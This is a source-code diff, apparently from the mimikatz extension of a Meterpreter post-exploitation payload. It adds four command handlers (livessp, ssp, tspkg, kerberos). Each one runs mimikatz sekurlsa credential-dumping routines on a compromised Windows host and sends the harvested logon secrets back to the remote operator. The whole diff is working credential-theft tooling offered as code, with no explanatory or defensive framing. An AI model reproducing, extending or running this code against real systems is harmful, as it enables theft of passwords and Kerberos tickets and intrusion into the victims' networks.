@@ -95,6 +95,102 @@ DWORD request_msv1_0(Remote *remote, Packet *packet)
 	return ERROR_SUCCESS;	
 }
 
+DWORD request_livessp(Remote *remote, Packet *packet)
+{
+	Packet * response = packet_create_response(packet);
+	bool iResult = 0;
+
+	clear_buffer();
+
+	wstring function = (L"sekurlsa::livessp");
+	vector<wstring> *args = new vector<wstring>();
+
+	initialize_mimikatz();
+	myMimiKatz->doCommandeLocale(&function, args);
+	delete args;
+
+	wchar_t* output = convert_wstring_to_wchar_t(oss.str()); 
+	
+	clear_buffer();
+
+	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
+	packet_transmit_response(iResult, remote, response);
+
+	return ERROR_SUCCESS;	
+}
+
+DWORD request_ssp(Remote *remote, Packet *packet)
+{
+	Packet * response = packet_create_response(packet);
+	bool iResult = 0;
+
+	clear_buffer();
+
+	wstring function = (L"sekurlsa::ssp");
+	vector<wstring> *args = new vector<wstring>();
+
+	initialize_mimikatz();
+	myMimiKatz->doCommandeLocale(&function, args);
+	delete args;
+
+	wchar_t* output = convert_wstring_to_wchar_t(oss.str()); 
+	
+	clear_buffer();
+
+	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
+	packet_transmit_response(iResult, remote, response);
+
+	return ERROR_SUCCESS;	
+}
+
+DWORD request_tspkg(Remote *remote, Packet *packet)
+{
+	Packet * response = packet_create_response(packet);
+	bool iResult = 0;
+
+	clear_buffer();
+
+	wstring function = (L"sekurlsa::tspkg");
+	vector<wstring> *args = new vector<wstring>();
+
+	initialize_mimikatz();
+	myMimiKatz->doCommandeLocale(&function, args);
+	delete args;
+
+	wchar_t* output = convert_wstring_to_wchar_t(oss.str()); 
+	
+	clear_buffer();
+
+	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
+	packet_transmit_response(iResult, remote, response);
+
+	return ERROR_SUCCESS;	
+}
+
+DWORD request_kerberos(Remote *remote, Packet *packet)
+{
+	Packet * response = packet_create_response(packet);
+	bool iResult = 0;
+
+	clear_buffer();
+
+	wstring function = (L"sekurlsa::kerberos");
+	vector<wstring> *args = new vector<wstring>();
+
+	initialize_mimikatz();
+	myMimiKatz->doCommandeLocale(&function, args);
+	delete args;
+
+	wchar_t* output = convert_wstring_to_wchar_t(oss.str()); 
+	
+	clear_buffer();
+
+	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
+	packet_transmit_response(iResult, remote, response);
+
+	return ERROR_SUCCESS;	
+}
+
 Command customCommands[] =
 {
 	{ "mimikatz_wdigest",
@@ -105,7 +201,22 @@ Command customCommands[] =
 	  { request_msv1_0,                                    { 0 }, 0 },
 	  { EMPTY_DISPATCH_HANDLER                                      },
 	},
-
+	{ "mimikatz_livessp",
+	  { request_livessp,                                    { 0 }, 0 },
+	  { EMPTY_DISPATCH_HANDLER                                      },
+	},
+	{ "mimikatz_ssp",
+	  { request_ssp,                                    { 0 }, 0 },
+	  { EMPTY_DISPATCH_HANDLER                                      },
+	},
+	{ "mimikatz_tspkg",
+	  { request_tspkg,                                    { 0 }, 0 },
+	  { EMPTY_DISPATCH_HANDLER                                      },
+	},
+	{ "mimikatz_kerberos",
+	  { request_kerberos,                                    { 0 }, 0 },
+	  { EMPTY_DISPATCH_HANDLER                                      },
+	},
 	// Terminator
 	{ NULL,
 	  { EMPTY_DISPATCH_HANDLER                      },
